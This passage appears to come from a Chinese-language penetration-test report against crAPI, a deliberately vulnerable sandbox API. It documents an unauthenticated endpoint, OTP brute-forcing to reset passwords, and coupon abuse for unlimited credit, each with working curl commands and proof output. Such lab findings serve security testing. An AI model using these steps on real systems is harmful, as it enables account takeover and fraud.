1. 无需认证访问机械师报告端点:
   ```bash
   curl -X GET "https://crapi.sandbox.local:8888/workshop/api/mechanic/receive_report" \
     -H "Content-Type: application/json"
   ```

**影响证明:**
成功无需认证访问端点，接收字段验证要求:
```json
{"mechanic_code":["This field is required."],"problem_details":["This field is required."],"vin":["This field is required."]}
```

这证明了认证绕过 - 端点处理请求并返回字段要求，而不是认证错误，表明任何人都可以无需适当凭证访问此机械师功能。

---

### AUTHZ-VULN-12: OTP验证暴力攻击绕过

**摘要:**
- **漏洞位置:** POST /identity/api/auth/v2/check-otp
- **概述:** 工作流程绕过，允许密码重置的无限OTP暴力尝试
- **影响:** 能够通过OTP枚举重置任何用户的密码
- **严重性:** 严重

**先决条件:** 目标用户电子邮件地址

**利用步骤:**
1. 启动密码重置工作流程:
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" \
     -H "Content-Type: application/json" \
     -d '{"email": "testuser2@example.com"}'
   ```

2. 执行系统OTP暴力攻击:
   ```bash
   # 测试从000000到999999的多个OTP值
   curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/v2/check-otp" \
     -H "Content-Type: application/json" \
     -d '{
       "email": "testuser2@example.com",
       "otp": "000000",
       "password": "NewHackedPassword123!"
     }'
   ```

**影响证明:**
系统测试确认完全没有暴力攻击保护:
- **执行了34次连续OTP尝试**，无任何速率限制
- **未检测到账户锁定机制**
- **无时间变化**防止自动攻击
- **所有无效OTP的一致错误响应**
- **服务器全速接受无限请求**

v2端点允许无限OTP枚举，使得系统测试所有1,000,000个可能的OTP组合 (000000-999999) 以重置任何用户的密码成为可能。

---

### AUTHZ-VULN-14: 优惠券应用工作流程绕过

**摘要:**
- **漏洞位置:** POST /workshop/api/shop/apply_coupon
- **概述:** 业务逻辑绕过，允许无需适当购物车状态应用优惠券
- **影响:** 能够无需购买物品累积无限商店信用
- **严重性:** 高

**先决条件:** 有效的JWT Bearer令牌，有效的优惠券代码

**利用步骤:**
1. 创建测试优惠券:
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/community/api/v2/coupon/new-coupon" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [USER_TOKEN]" \
     -d '{
       "amount": "20",
       "coupon_code": "TESTCOUPON20"
     }'
   ```

2. 无需购物车工作流程应用优惠券:
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [USER_TOKEN]" \
     -d '{
       "coupon_code": "TESTCOUPON20",
       "amount": 100
     }'
   ```

**影响证明:**
成功绕过正常购物工作流程并累积信用:
```json
{"credit":200.0,"message":"Coupon successfully applied!"}
```

应用程序授予了$200.00的商店信用，无需购物车中有任何物品或遵循适当的购物工作流程。这允许攻击者通过重复应用优惠券而不购买任何产品来累积无限商店信用。